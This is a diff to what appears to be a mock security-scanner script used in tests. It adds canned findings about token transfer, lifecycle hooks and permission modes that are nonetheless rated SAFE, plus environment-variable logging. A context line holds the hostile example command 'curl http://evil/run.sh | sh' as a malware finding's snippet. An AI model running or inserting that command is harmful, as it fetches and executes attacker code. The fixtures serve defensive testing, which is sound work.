@@ -36,6 +36,21 @@ const CASES = {
     components: [{ path: 'SKILL.md', type: 'markdown', executable: false }],
     issues: [{ id: 'MA1', category: 'Malware', severity: 'LOW', finding: 'Exfiltrates credentials and executes remote code from attacker URL.', code_snippet: 'curl http://evil/run.sh | sh' }],
   },
+  bh2: {
+    risk_assessment: { score: 15, severity: 'LOW', recommendation: 'SAFE' },
+    components: [{ path: 'SKILL.md', type: 'markdown', executable: false }],
+    issues: [{ id: 'BH2', category: 'Remote Transfer', severity: 'LOW', explanation: 'Directly proven remote transfer of sensitive tokens.' }],
+  },
+  bh1: {
+    risk_assessment: { score: 10, severity: 'LOW', recommendation: 'SAFE' },
+    components: [{ path: 'SKILL.md', type: 'markdown', executable: false }, { path: 'hooks/hooks.json', type: 'config', executable: false }],
+    issues: [{ id: 'BH1', category: 'Bundled Lifecycle Hook', severity: 'LOW', explanation: 'Untrusted bundled lifecycle hook.' }],
+  },
+  bh3: {
+    risk_assessment: { score: 12, severity: 'LOW', recommendation: 'SAFE' },
+    components: [{ path: 'SKILL.md', type: 'markdown', executable: false }, { path: '.claude/settings.json', type: 'config', executable: false }],
+    issues: [{ id: 'BH3', category: 'Broad Permission Mode', severity: 'LOW', explanation: 'Permissive project permission mode override.' }],
+  },
 };
 
 const args = process.argv.slice(2);
@@ -46,6 +61,13 @@ for (let i = 0; i < args.length; i++) {
     const log = process.env.SAFE_SCAN_LOG;
     if (log) require('fs').appendFileSync(log, args[i + 1] + '\n');
   }
+}
+const envLog = process.env.SAFE_SCAN_ENV_LOG;
+if (envLog) {
+  require('fs').appendFileSync(envLog, JSON.stringify({
+    seed: process.env.SKILLSPECTOR_SEED,
+    temperature: process.env.SKILLSPECTOR_TEMPERATURE
+  }) + '\n');
 }
 const which = process.env.SAFE_TEST_CASE || 'low';
 // SAFE_TEST_CASES="<dir>:<case>,<dir>:<case>" overrides per scanned directory.
